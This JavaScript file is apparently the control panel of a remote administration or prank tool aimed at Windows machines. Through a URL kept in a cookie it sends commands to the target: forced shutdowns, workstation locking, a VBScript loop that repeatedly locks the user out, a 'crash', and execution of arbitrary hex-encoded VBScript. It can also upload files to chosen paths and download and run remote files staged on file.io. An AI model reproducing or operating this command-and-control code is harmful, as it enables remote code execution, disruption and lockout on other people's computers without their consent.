// If you are confused, lmk
// https://github.com/MrBreakNFix/website

document.addEventListener("DOMContentLoaded", function() {
    // matrix
    var matrix = localStorage.getItem("matrix");
    if (matrix === "block") {
        document.getElementById("Matrix").style.display = "block";
    } else {
        document.getElementById("Matrix").style.display = "none";
    }
    document.querySelector('.main').style.display = 'block';
    document.querySelector(".main").classList.add("sliding-in");
});
// if "url" cookie exists
// https://i.imgur.com/1mRHQPw.png
    if (!checkCookie('url')) {
        window.location.href = 'login.html';
    } else {
        var url = getCookie('url');
    }
    //slide in

    document.addEventListener("DOMContentLoaded", function () {
        var buttons = document.querySelectorAll("button");

        buttons.forEach(function (button) {
            button.addEventListener("click", function () {
                // for making red
                button.classList.add("clicked");

                // removes red after 2
                setTimeout(function () {
                    button.classList.remove("clicked");
                }, 2000);
            });
        });
    });
    // disable the red squigles underneath the text
    document.getElementById("editorTextarea").setAttribute("spellcheck", "false");
    const canvas = document.getElementById('Matrix');
    const context = canvas.getContext('2d');

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const fontSize = 15;
    const columns = canvas.width/fontSize;

    const drops = [];

    for (let x = 0; x < columns; x++) {
        drops[x] = 1;
        drops[x] = Math.floor(Math.random() * 100);
    }
    const draw = () => {
        context.fillStyle = 'rgba(0, 0, 0, 0.05)';
        context.fillRect(0, 0, canvas.width, canvas.height);
        context.fillStyle = '#008100';

        for(let i = 0; i < drops.length; i++)
        {
            const text = "10".charAt(Math.floor(Math.random() * "10".length));
            context.fillText(text, i*fontSize, drops[i]*fontSize);

            if(drops[i]*fontSize > canvas.height && Math.random() > 0.975){
                drops[i] = 0;
            }
            drops[i]++;
        }
    };
    setInterval(draw, 40);

    if (window.history.replaceState) {
        window.history.replaceState(null, null, window.location.href);
    }


    function sendRequest() {
    var timestamp = new Date().toISOString();
    var username = "webapp";
    var data = encodeURIComponent(document.getElementById("data").value);
    // extract url to a string
    var url = getCookie('url');

    url += "?mode=responda1";
    url += "&data=" + data;
    url += "&timestamp=" + timestamp;
    url += "&username=" + username;

    console.log("Generated URL:", url);

    fetch(url)
            .then(response => response.text())
            .then(data => {
              console.log("Response:", data);
              showResponse(data, 'success');
            })
            .catch(error => {
              console.error("Error:", error);
              showResponse('Error occurred during request.', 'error');
            });
  }


  function send(action) {
    let predefinedData = '';

    if (action === 'calc') {
      predefinedData = 'calc';
    } else if (action === 'notepad') {
      predefinedData = 'notepad';
    } else if (action === 'shutdown60') {
      predefinedData = 'shutdown -r -t 60';
    } else if (action === 'shutdown10') {
      predefinedData = 'shutdown -s -t 60';
    } else if (action === 'shutdown') {
      predefinedData = 'shutdown -s -t 0';
    } else if (action === 'logout') {
      predefinedData =  'shutdown -l';
    } else if (action === 'signout') {
      predefinedData = 'rundll32.exe user32.dll,LockWorkStation';
    } else if (action === 'rick') {
      predefinedData = 'url https://www.youtube.com/watch?v=dQw4w9WgXcQ';
    } else if (action === 'vol100') {
      predefinedData = 'mshta \"javascript:function r(){var s=new ActiveXObject(\'WScript.Shell\');for(var i=0;i<100;i++)s.SendKeys(String.fromCharCode(0xAF))}r();close()"';
    } else if (action === 'vol0') {
      predefinedData = 'mshta \"javascript:function r(){var s=new ActiveXObject(\'WScript.Shell\');for(var i=0;i<100;i++)s.SendKeys(String.fromCharCode(0xAE))}r();close()"';
    } else if (action === 'brightness100') {
      predefinedData = 'mshta \"javascript:function r(){var s=new ActiveXObject(\'WScript.Shell\');for(var i=0;i<100;i++)s.SendKeys(String.fromCharCode(0xBB))}r();close()"';
    } else if (action === 'brightness0') {
      predefinedData = 'mshta \"javascript:function r(){var s=new ActiveXObject(\'WScript.Shell\');for(var i=0;i<100;i++)s.SendKeys(String.fromCharCode(0xBD))}r();close()"';
    } else if (action === 'crash') {
        predefinedData = 'crash';
    } else if (action === 'disableLoginForXSeconds') {
        seconds = document.getElementById("seconds").value;
        vbcmd = 'For t=Timer To Timer+' + seconds +'\n' +
            '    Do:CreateObject("WScript.Shell").Run "rundll32.exe user32.dll,LockWorkStation",0,True:Loop While Timer<t\n' +
            'Next'
        predefinedData = 'vbs ' + convertToHex(vbcmd);
    }
    document.getElementById("data").value = predefinedData;
    sendRequest();
  }

  function uploadFile() {
    var filePath = encodeURIComponent(document.getElementById("filePath").value);
    var fileInput = document.getElementById("file");
    var file = fileInput.files[0];

    if (file) {
      var fileReader = new FileReader();
      fileReader.onload = function (e) {
        var fileContent = e.target.result;
        var fileContentHex = convertToHex(fileContent);
        var timestamp = new Date().toISOString();
        var username = "webapp";


        url += "?mode=uploadFile";
        url += "&filepath=" + filePath;
        url += "&filecontenthex=" + fileContentHex;
        url += "&fileasHex=true";

        console.log("Generated File Upload URL:", url);

        fetch(url)
                .then(response => response.text())
                .then(data => {
                  console.log("File Upload Response:", data);
                  showResponse('File uploaded successfully.', 'success');
                })
                .catch(error => {
                  console.error("File Upload Error:", error);
                  showResponse('Error occurred during file upload.', 'error');
                });
      };

      fileReader.readAsText(file);
    } else {
      console.error("No file selected for upload.");
      showResponse('No file selected for upload.', 'error');
    }
  }

  function convertToHex(text) {
    var hex = '';
    for (var i = 0; i < text.length; i++) {
      hex += text.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return hex;
  }

  function downloadFile() {
    document.getElementById("data").value = "getfile";
    sendRequest();
  }

  function runFile() {
    document.getElementById("data").value = "runfile";
    sendRequest();
  }
  function downloadLargeFile() {
      document.getElementById("data").value = "download " + document.getElementById("lfileUrl").value + " " + document.getElementById("lfilePath").value;
      sendRequest();
  }
    function runLargeFile() {
        document.getElementById("data").value = "run " + document.getElementById("lfilePath").value + " " + document.getElementById("lfileUrl").value;
        sendRequest();
    }

    function showResponse(message, type) {
        var responseNotifier = document.getElementById('responseNotifier');
        var countdownBar = document.createElement('div');

        responseNotifier.textContent = "Wait for 10 seconds to send another message to ensure this has executed: " + message;
        responseNotifier.className = type;
        responseNotifier.style.display = 'block';

        countdownBar.className = 'countdown-bar';
        countdownBar.style.backgroundColor = 'red';
        responseNotifier.appendChild(countdownBar);

        countdownBar.style.width = '100%';

        setTimeout(function () {
            responseNotifier.style.opacity = '0';
            setTimeout(function () {
                responseNotifier.style.display = 'none';
                responseNotifier.removeChild(countdownBar);
            }, 500); // fade out duration
        }, 12000);

        // Updates bar per 100ms
        var startTime = Date.now();
        var duration = 12000;
        var interval = setInterval(function () {
            var elapsed = Date.now() - startTime;
            var remainingWidth = 100 - (elapsed / duration) * 100;

            if (remainingWidth <= 0) {
                clearInterval(interval);
            } else {
                countdownBar.style.width = remainingWidth + '%';
            }
        }, 100);
    }

  async function largeFileUploadAndConvert(event) {
      event.preventDefault();
      var fileInput = document.getElementById('largeFileIn');
      var output = document.getElementById('lfileUrl');

      if (fileInput.files.length > 0) {
          var file = fileInput.files[0];

          var formData = new FormData();
          formData.append('file', file);

          try {
              var response = await fetch('https://file.io/', {
                  method: 'POST',
                  body: formData
              });

              var result = await response.json();
              output.value = result.link;

          } catch (error) {
              console.error('Error uploading the file:', error);
              output.innerHTML = '<p>Error uploading the file.</p>';
          }
      } else {
          alert('Please select a file before uploading.');
      }
  }
    function ConsoleSend(){
        var text = document.getElementById("editorTextarea").value;
        var hex = convertToHex(text);
        document.getElementById("data").value = "vbs " + hex;
        sendRequest();
    }
function ConsoleClear(){
    document.getElementById("editorTextarea").value = "";
} // idk why i added this, might use it later

function ImportScript(){
    var fileInput = document.getElementById("importfile");
    var file = fileInput.files[0];
    //then we read the file
    if (file) {
        var fileReader = new FileReader();
        fileReader.onload = function (e) {
            var fileContent = e.target.result;
            document.getElementById("editorTextarea").value = fileContent;
        };
        fileReader.readAsText(file);
    } else {
        console.error("No file selected for upload.");
        showResponse('No file selected for upload.', 'error');
    }
}
function DownloadScript(){
    var text = document.getElementById("editorTextarea").value;

    var element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
    element.setAttribute('download', "script.vbs");
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}
 function logout() {
     // remove slide-in
        var main = document.querySelector(".main");
        main.classList.remove("sliding-in");

        // slide out
        main.classList.add("sliding-out");
     // logs you out by deleting the cookie
     setTimeout(function () {
         deleteCookie('url');
     }, 1000);
 }

 function deleteCookie(cookieName) {
    document.cookie = cookieName + "=;expires=Thu, 01 Jan 1970 00:00:01 GMT;";
    window.location.href = "login.html";
}
 function checkCookie(name) {
     const cookies = document.cookie.split(';');
     for (let i = 0; i < cookies.length; i++) {
         const cookie = cookies[i].trim();
         if (cookie.startsWith(name + '=')) {
             return true;
         }
     }
     return false;
 }
function getCookie(name) {
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (cookie.startsWith(name + '=')) {
            return cookie.substring(name.length + 1);
        }
    }
    return null;
}
function toggleMatrix() {
        //store value in local storage
    var matrix = document.getElementById("Matrix");
    if (matrix.style.display === "none") {
        matrix.style.display = "block";
        localStorage.setItem("matrix", "block");
    } else {
        matrix.style.display = "none";
        localStorage.setItem("matrix", "none");
    }
}